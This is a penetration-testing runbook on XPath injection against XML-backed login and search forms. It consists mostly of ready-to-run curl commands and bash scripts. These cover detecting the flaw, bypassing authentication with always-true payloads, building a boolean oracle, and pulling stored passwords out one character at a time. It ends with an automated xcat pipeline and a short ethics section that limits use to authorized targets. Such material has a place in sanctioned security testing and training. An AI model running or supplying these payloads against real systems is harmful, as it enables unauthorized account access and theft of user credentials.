---
title: "XPath Injection"
description: "Injecting into XPath queries to bypass authentication and extract XML node data blindly from the server."
phase: Web
order: 77
tags:
  - xpath
  - injection
  - xml
  - authentication
tools:
  - burp suite
  - xcat
updated: 2026-10-01
---

XPath queries an XML document with a path syntax similar to SQL. When user input is concatenated into a query, the logic can be altered and the whole XML tree walked node by node. This runbook finds XPath-backed inputs, breaks authentication, builds a boolean oracle, and extracts one proof value — on **in-scope** targets only.

## 1. Find XPath-backed inputs

Login forms and search features over XML data stores are the usual homes.

```bash
curl -s -i "https://target.com/search?q=test" | tail -n 20
curl -s -i "https://target.com/search?q=test%27" | tail -n 20

# Login form backed by /users/user[username='X' and password='Y']
curl -s -i -X POST https://target.com/login -d "username=admin&password=admin"
```

A `'` that throws a parse error, changes the result count, or flips a message is your first signal.

## 2. Break authentication

Classic always-true payloads make the predicate match the first node.

```bash
curl -s -i -X POST https://target.com/login \
  --data-urlencode "username=' or '1'='1" --data-urlencode "password=anything"
curl -s -i -X POST https://target.com/login \
  --data-urlencode "username=' or 1=1 or ''='" --data-urlencode "password=anything"
curl -s -i -X POST https://target.com/login \
  --data-urlencode "username=admin' or '1'='1' or ''='" --data-urlencode "password=anything"
```

If the app returns the first user node, you are logged in as that user.

## 3. Establish a boolean oracle

With no visible output, ask true/false questions and watch a binary side effect.

```bash
TRUE="' or string-length(//user[1]/password)=8 or ''='"
FALSE="' or string-length(//user[1]/password)=1 or ''='"
curl -s -X POST https://target.com/login --data-urlencode "username=$TRUE" \
  --data-urlencode "password=x" -o /dev/null -w "true  size=%{size_download}\n"
curl -s -X POST https://target.com/login --data-urlencode "username=$FALSE" \
  --data-urlencode "password=x" -o /dev/null -w "false size=%{size_download}\n"
```

## 4. Enumerate structure, then extract

Map the document before pulling values: count nodes, read names, probe attributes.

```bash
# How many <user> nodes?  name(//user[1]/*[1])='id'  //user[1]/@*[1]='admin'
curl -s -X POST https://target.com/login \
  --data-urlencode "username=' or count(//user)=5 or ''='" \
  --data-urlencode "password=x" -o /dev/null -w "count5 size=%{size_download}\n"

# Blind char-by-char extraction using the oracle
for i in $(seq 1 8); do
  for c in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9; do
    q="' or substring(//user[1]/password,$i,1)='$c' or ''='"
    out=$(curl -s -X POST https://target.com/login --data-urlencode "username=$q" \
      --data-urlencode "password=x" -o /dev/null -w "%{size_download}")
    [ "$out" != "0" ] && printf "%s" "$c"
  done
done; echo
```

## 5. Automate with xcat

Blind extraction by hand is slow; `xcat` drives the same oracle. `document()` may let some engines fetch external DTDs. Stop at a single proof and redact it.

```bash
xcat --method POST --data "username=INJECT&password=x" --param username \
  --inject "' or {QUERY} or ''='" \
  --query "string(//user[1]/username)" "https://target.com/login"
```

## Full pipeline

```bash
U="https://target.com/login"

# 1. Detect injection: baseline vs quote
curl -s -o /dev/null -w "base  %{http_code} %{size_download}\n" \
  -X POST "$U" --data-urlencode "username=test" --data-urlencode "password=x"
curl -s -o /dev/null -w "quote %{http_code} %{size_download}\n" \
  -X POST "$U" --data-urlencode "username=test'" --data-urlencode "password=x"
# 2. Auth bypass
curl -s -i -X POST "$U" \
  --data-urlencode "username=' or 1=1 or ''='" --data-urlencode "password=x" | head -n 20
# 3. Boolean oracle sanity check
curl -s -o /dev/null -w "true  %{size_download}\n" -X POST "$U" \
  --data-urlencode "username=' or 1=1 or ''='" --data-urlencode "password=x"
curl -s -o /dev/null -w "false %{size_download}\n" -X POST "$U" \
  --data-urlencode "username=' or 1=2 or ''='" --data-urlencode "password=x"
# 4. Automated staged extraction
xcat --method POST --data "username=INJECT&password=x" --param username \
  --inject "' or {QUERY} or ''='" --query "string(//user[1]/password)" "$U"
```

## Ethics & legality

- Test only XML-backed apps you are authorized to assess.
- Blind extraction is request-heavy; keep concurrency low and stop at one proof value.
- Never log or exfiltrate real user passwords — mask them in every report.
- Record the exact payload, response delta, and timestamp as reproducible evidence.
